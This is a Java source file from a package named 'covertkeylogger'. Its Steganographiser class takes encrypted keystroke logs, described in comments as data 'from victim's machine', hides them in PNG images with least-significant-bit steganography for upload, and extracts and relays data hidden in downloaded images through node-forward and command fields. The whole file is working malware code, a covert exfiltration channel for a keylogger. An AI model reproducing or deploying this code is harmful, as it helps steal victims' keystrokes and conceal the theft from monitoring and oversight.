package covertkeylogger;

import java.awt.image.RenderedImage;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.steganography.carrier.CarrierImage;
import org.steganography.error.CarrierAccessSchemeException;
import org.steganography.error.CarrierHidingSchemeException;
import org.steganography.error.CarrierInitializationException;
import org.steganography.error.CarrierSizeException;
import org.steganography.error.CompatibilityException;
import org.steganography.error.HidingComponentInitializationException;
import org.steganography.error.HidingComponentSizeException;
import org.steganography.error.HidingException;
import org.steganography.error.InvalidTypeException;
import org.steganography.error.RevealingException;
import org.steganography.hiding.HidingFile;
import org.steganography.hiding.HidingText;
import org.steganography.misc.ImageManager;
import org.steganography.schemes.image.access.SequentialImageAccessScheme;
import org.steganography.schemes.image.hiding.DualLSBImageHidingScheme;
import org.steganography.schemes.image.hiding.SingleLSBImageHidingScheme;
import org.steganography.schemes.modulation.SimpleComponentModulationScheme;

/**
 * 
 * @author Megan Thomas
 */

public class Steganographiser {
	
	
	/*method to assemble a string to be embedded in an image, consisting of a command message
	 *and any data to be embedded
	 */
	private String newUploadData(List<Character> data,  Character cCMsg, Character nodeForward) {
		String stegText = nodeForward + ":" + cCMsg + ":";
		
		for(int i = 0; i < data.size(); i++) {
			stegText = stegText + data.get(i);
		}
		
		
		return stegText;
	}
	
	//test method to embed encrypted data in one test image
	public void stegoTest() {
		SequentialImageAccessScheme seqImScheme = new SequentialImageAccessScheme();
		DualLSBImageHidingScheme imHidingScheme = new DualLSBImageHidingScheme();
		SimpleComponentModulationScheme compModScheme = new SimpleComponentModulationScheme();
	
		CarrierImage carrierImage = new CarrierImage(seqImScheme, imHidingScheme, compModScheme);
		StoreToList store = new StoreToList("logfile.txt");
		Character nodeForward = '3';
		Character cCMsg = null;
		
	 
		ImageManager imgManager = new ImageManager();
		try {
				//the image to embed data in
				File f = new File("Truecolor.png");
				if(f.exists()) {
					//get the list of encrypted data to embed
					store.generateList();
					List<String> data = store.getEncryptedList();
					
					String stegText = nodeForward + ":" + cCMsg + ":";
					
					for(int i = 0; i < data.size(); i++) {
						stegText = stegText + data.get(i) + " ";
					}
					
					System.out.println("stegText: " + stegText);
					
					RenderedImage img = imgManager.loadImage(f);
					
					carrierImage.setCarrierImage(img);
				 
					HidingText hidingText = new HidingText();
					hidingText.setText(stegText);
					
					//embed data in the image chosen
					carrierImage.hide(hidingText);
					//create a new image file to write the stego image to
					File fS = new File("downloaded/image0.png");
					ImageManager.writeImage(carrierImage.getCarrierImage(), fS, true);
					
					System.out.println("Finished Steganography");
				}
				else {
					System.out.println("File does not exist :/");
				}
				
			
			
		} catch (InvalidTypeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CarrierInitializationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (HidingComponentInitializationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (HidingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (HidingComponentSizeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CarrierSizeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CarrierAccessSchemeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CarrierHidingSchemeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CompatibilityException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		finally {
			imgManager.terminate();
		}
	}
	
	//not needed at the moment
	/*private ArrayList<Character> processDownloadData(ArrayList<Character> deStegData) {
		ArrayList<Character> stegChars = new ArrayList<Character>();
		
		String[] split = deSteg.split(":");
		
		int nodeFwd = Integer.parseInt(split[0]);
		String cC = split[1];
		String stegText = split[2];
		
		for(int i = 0; i < stegText.length(); i++) {
			stegChars.add(stegText.charAt(i));
		}
		
		try {
			File dataFile = new File("stegData.txt");
			
			if(!dataFile.exists()) {
				dataFile.createNewFile();
			}
			
			BufferedWriter write = new BufferedWriter(new FileWriter("stegData.txt"));
			
			write.write(stegText);
			write.close();
			System.out.println("text written to data file");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		return stegChars;

		
	}*/
	
	/*method to take images from the "stock" folder, embed any encrypted data to be transmitted
	 * within the images and place the stego images in the "upload" folder
	 */
	public void steganographise(ArrayList<Character> deStegData) {
		SequentialImageAccessScheme seqImScheme = new SequentialImageAccessScheme();
		DualLSBImageHidingScheme imHidingScheme = new DualLSBImageHidingScheme();
		SimpleComponentModulationScheme compModScheme = new SimpleComponentModulationScheme();
		StoreToList store = new StoreToList("logfile.txt");
	
		CarrierImage carrierImage = new CarrierImage(seqImScheme, imHidingScheme, compModScheme);
		ImageManager imgManager = new ImageManager();
		//Character nodeForward = '3';
		//Character cCMsg = null;
		
		ArrayList<Character> data = new ArrayList<Character>();
		
		//get any data to be transmitted from victim's machine
		store.generateList();
		List<String> vicData = store.getEncryptedList();
		String vicText = "";
		
		for(int i = 0; i < vicData.size(); i++) {
			vicText = vicText + vicData.get(i) + " ";
		}
		
		for(int x = 0; x < vicText.length(); x++) {
			data.add(vicText.charAt(x));
		}
		
		//amalgamate data from downloaded images and data from victim's machine
		data.addAll(deStegData);
		System.out.println("desteg data received: " + deStegData);
		System.out.println("total data: " + data);
		
		
		try {
			//keep steganographising until images in "stock" run out or data runs out
			
				for(int i = 0;;i++) {
					File f = new File("stock/image" + i + ".png");
					
					if(f.exists() && !data.isEmpty()) {
						//limit size of data to be embedded to maximum size of data allowed given size of image
						ArrayList<Character> insertData = new ArrayList<Character>();
						for(int j = 0; j < 5900; j++) {
							while(!data.isEmpty()){
								insertData.add(data.get(j));
								data.remove(j);
								//System.out.println("size of data array: " + data.size());
							}
							
						}
						String stegText = newUploadData(insertData, null, '3');
						
						System.out.println("in stego if");
						System.out.println("stegText: " + stegText);
						
						RenderedImage img = imgManager.loadImage(f);
						
						carrierImage.setCarrierImage(img);
						
						HidingText hidingText = new HidingText();
						hidingText.setText(stegText);
						
						//embed data within image 
						carrierImage.hide(hidingText);
						//create a new image file to write the stego image to
						File fS = new File("upload/image" + i + ".png");
						ImageManager.writeImage(carrierImage.getCarrierImage(), fS, true);  
					}
					else {
						System.out.println("Finished Steganography");
						break;
					}
				}
			
			
		} catch (InvalidTypeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CarrierInitializationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (HidingComponentInitializationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (HidingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (HidingComponentSizeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CarrierSizeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CarrierAccessSchemeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CarrierHidingSchemeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CompatibilityException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		finally {
			imgManager.terminate();
		}
	}
	
	/*method to desteganographise each image in the "downloaded" folder and place the extracted
	 * data in an arraylist
	 */
	public void deSteganographise() {
		SequentialImageAccessScheme seqImScheme = new SequentialImageAccessScheme();
		DualLSBImageHidingScheme imHidingScheme = new DualLSBImageHidingScheme();
		SimpleComponentModulationScheme compModScheme = new SimpleComponentModulationScheme();
		ArrayList<Character> deStegData = new ArrayList<Character>();
		
	
		CarrierImage carrierImage = new CarrierImage(seqImScheme, imHidingScheme, compModScheme);
	 
		ImageManager imgManager = new ImageManager();
		try {
			for(int i = 0;;i++) {
				System.out.println("fucking herp");
				//System.in.read();

				
				File f = new File("downloaded/image" + i + ".png");
				System.out.println("file is: " + f.getName());
				
				if(f.exists()) {
					System.out.println("in deStego if loop");
					
					//System.in.read();
					
					RenderedImage img = imgManager.loadImage(f);
					
					carrierImage.setCarrierImage(img);
					HidingText hidingText = new HidingText();
					
					carrierImage.reveal(hidingText);
					String deSteg = hidingText.getText();
					
					if(deSteg.length() < 1) {
						System.out.println("no data in image!");
					}
					else {
						System.out.println("size of hiding text: " + hidingText.getSize());
						
						System.out.println("deSteg data: " + deSteg);
						
						//split the extracted string into data and command message
						String[] split = deSteg.split(":");
						
						String cC = split[0];
						String stegText = split[2];
						
						for(int j = 0; j < stegText.length(); j++) {
							deStegData.add(stegText.charAt(j));
						}
						
						System.out.println("deStegText: " + stegText);
					}
					
					
				}
				else {
					System.out.println("Finished Desteganography");
					steganographise(deStegData);
					break;
				}
				
			}
			
		}
		catch (InvalidTypeException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
		}
		catch (IOException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
		} catch (CarrierInitializationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (HidingComponentInitializationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (RevealingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (HidingComponentSizeException e) {
			// TODO Auto-generated catch block
			//e.printStackTrace();
		} catch (CarrierSizeException e) {
			// TODO Auto-generated catch block
			//e.printStackTrace();
		} catch (CarrierAccessSchemeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CarrierHidingSchemeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (CompatibilityException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		finally {
			imgManager.terminate();
		}
		
		
	}
	
	public static void main(String args[]) {
		Steganographiser steg = new Steganographiser();
		steg.stegoTest();
		steg.deSteganographise();
	}
	
	
}
